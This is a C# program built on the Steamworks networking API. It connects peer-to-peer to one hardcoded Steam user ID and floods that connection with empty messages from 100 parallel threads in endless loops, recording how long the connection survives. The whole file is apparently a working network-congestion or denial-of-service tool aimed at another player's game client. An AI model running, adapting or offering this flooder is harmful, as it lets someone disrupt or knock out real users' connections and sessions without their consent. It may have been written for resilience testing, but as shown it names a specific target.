using ScrapRat;
using Steamworks;
using System.Diagnostics;

namespace NetworkCongestion
{
    internal class Program
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 500 }
            },
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = int.MaxValue }
            }
        ];

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(AppContext.BaseDirectory)!.FullName;
            Console.WriteLine(Environment.CurrentDirectory);
            File.WriteAllText("steam_appid.txt", "387990");

            SteamAPI.Init();
            SteamNetworkingIdentity NetworkingIdentity = new();
            NetworkingIdentity.SetSteamID(new CSteamID(76561198359772034));
            var conn = SteamNetworkingSockets.ConnectP2P(ref NetworkingIdentity, 0, LongTimeoutOptions.Length, LongTimeoutOptions);

            SteamAPI.RunCallbacks();
            SteamNetworkingSockets.GetConnectionInfo(conn, out var info);

            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ClosedByPeer)
            {
                SteamAPI.RunCallbacks();
                SteamNetworkingSockets.GetConnectionInfo(conn, out info);
            }

            Console.WriteLine("Connected!");
            
            Stopwatch sw = Stopwatch.StartNew();

            CancellationTokenSource cts = new();
            Console.CancelKeyPress += (object? sender, ConsoleCancelEventArgs e) =>
            {
                sw.Stop();
                Console.WriteLine($"Time connected: {sw.Elapsed}");
                File.WriteAllText("time_connected.txt", sw.Elapsed.ToString());
                cts.Cancel();
                e.Cancel = false;
                Environment.Exit(0);
            };

            byte[] ary = [];
            Parallel.For(0, 100, new ParallelOptions() { MaxDegreeOfParallelism = 100, CancellationToken = cts.Token }, _ =>
            {
                while (true)
                {
                    SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
                    SteamAPI.RunCallbacks();
                }
            });

            while (true) Console.ReadLine();
        }
    }
}
